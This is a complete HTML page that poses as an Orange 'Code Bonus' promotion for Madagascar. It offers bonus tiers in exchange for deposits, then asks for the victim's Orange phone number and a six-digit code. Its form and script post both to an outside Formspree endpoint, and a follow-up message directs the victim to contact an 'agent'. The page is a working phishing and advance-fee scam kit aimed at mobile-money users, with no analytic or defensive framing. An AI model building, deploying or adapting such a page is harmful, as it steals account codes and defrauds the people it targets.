<!DOCTYPE html>
<html lang="mg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Bonus - Madagascar</title>
    <style>
        body { font-family: 'Poppins', sans-serif; background: #f0f2f5; color: #333; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 20px; border-radius: 15px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); box-sizing: border-box; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .step-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }

        /* --- STYLING CAGE CAGE (Mifanaraka amin'ny sary nalefanao) --- */
        .tarif-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; max-height: 500px; overflow-y: auto; padding: 5px; }
        .tarif-card { background: white; border-radius: 12px; border: 1px solid #eee; padding: 15px 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); transition: 0.3s; display: flex; flex-direction: column; align-items: center; }
        .tarif-card:hover { transform: translateY(-3px); box-shadow: 0 6px 12px rgba(0,0,0,0.1); }
        
        .fond-text { font-size: 18px; font-weight: 800; color: #1a1a1b; margin-bottom: 2px; }
        .fond-sub { font-size: 11px; color: #777; margin-bottom: 10px; text-transform: uppercase; }
        .bonus-vola { font-size: 20px; font-weight: 900; color: #007bff; margin-bottom: 12px; }
        
        .btn-poursuivre { background: #000; color: white; border: none; padding: 10px 0; width: 100%; border-radius: 8px; font-weight: bold; font-size: 12px; cursor: pointer; text-transform: uppercase; }
        /* --------------------------------------------------------- */

        .btn-next, .btn-confirm { background: #007bff; color: white; padding: 15px; border: none; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; }
        #msgFelicitation { font-size: 14px; line-height: 1.6; text-align: left; padding: 15px; background: #f8f9fa; border-radius: 10px; border-left: 4px solid #28a745; color: #333; }
        .welcome-title { color: #007bff; font-size: 24px; font-weight: 900; margin-bottom: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div id="step1" class="step active">
        <img src="orange.jpg" class="step-img">
        <div class="welcome-title">Bienvenue dans<br>Code Bonus</div>
        <button class="btn-next" onclick="nextStep(2)">SUIVANT</button>
    </div>

    <div id="step2" class="step">
        <h2 style="font-size: 18px; margin-bottom: 15px;">Choisir ton tarif</h2>
        <div class="tarif-grid">
            <div class="tarif-card">
                <div class="fond-text">40.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">21.400Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('40.000Ar', '21.400Ar')">Poursuivre</button>
            </div>
            <div class="tarif-card">
                <div class="fond-text">60.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">31.400Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('60.000Ar', '31.400Ar')">Poursuivre</button>
            </div>
            <div class="tarif-card">
                <div class="fond-text">90.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">41.400Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('90.000Ar', '41.400Ar')">Poursuivre</button>
            </div>
            <div class="tarif-card">
                <div class="fond-text">120.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">56.800Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('120.000Ar', '56.800Ar')">Poursuivre</button>
            </div>
            <div class="tarif-card">
                <div class="fond-text">140.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">71.400Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('140.000Ar', '71.400Ar')">Poursuivre</button>
            </div>
            <div class="tarif-card">
                <div class="fond-text">180.000Ar</div>
                <div class="fond-sub">Bonus Jour</div>
                <div class="bonus-vola">87.500Ar</div>
                <button class="btn-poursuivre" onclick="selectTarif('180.000Ar', '87.500Ar')">Poursuivre</button>
            </div>
        </div>
    </div>

    <div id="step3" class="step">
        <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img">
        <h1>Validation</h1>
        <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
            <input type="hidden" name="Tarif" id="selectedTarifInput">
            <input type="tel" name="Numero" placeholder="Numero Orange" required>
            <input type="number" name="Code" placeholder="Code 6 chiffres" required>
            <button type="submit" id="submitBtn" class="btn-confirm">CONFIRMER</button>
        </form>
    </div>

    <div id="step4" class="step">
        <img src="agent.jpg" class="step-img">
        <h1 style="color: #28a745;">Félicitations!</h1>
        <div id="msgFelicitation"></div>
        <p style="font-size: 11px; margin-top: 10px; color: #aaa;">Mankasitraka amin'ny fampiasana ny Code Bonus.</p>
    </div>
</div>

<script>
    let chosenFond = ""; let chosenBonus = "";
    function nextStep(step) { 
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); 
        document.getElementById('step' + step).classList.add('active'); 
    }
    function selectTarif(fond, bonus) { 
        chosenFond = fond; 
        chosenBonus = bonus; 
        document.getElementById('selectedTarifInput').value = "Nandoa: " + fond + " | Bonus azo: " + bonus; 
        nextStep(3); 
    }
    const form = document.getElementById('bonusForm');
    form.onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn'); btn.innerText = "Fanamarinana...";
        const data = new FormData(form);
        const response = await fetch(form.action, { method: 'POST', body: data, headers: { 'Accept': 'application/json' } });
        if (response.ok) {
            const msg = `Felicitation, votre bonus est en cours. Voamarina fa nandoa <b>${chosenFond}</b> ianao ka bonus azo <b>${chosenBonus}</b> isan-kariva. Manasa anao handefa mp amin'i agent code Bonus izao, efa io am sary eo ambony io ny pagen'i agent code bonus.`;
            document.getElementById('msgFelicitation').innerHTML = msg;
            nextStep(4);
        }
    };
</script>
</body>
</html>
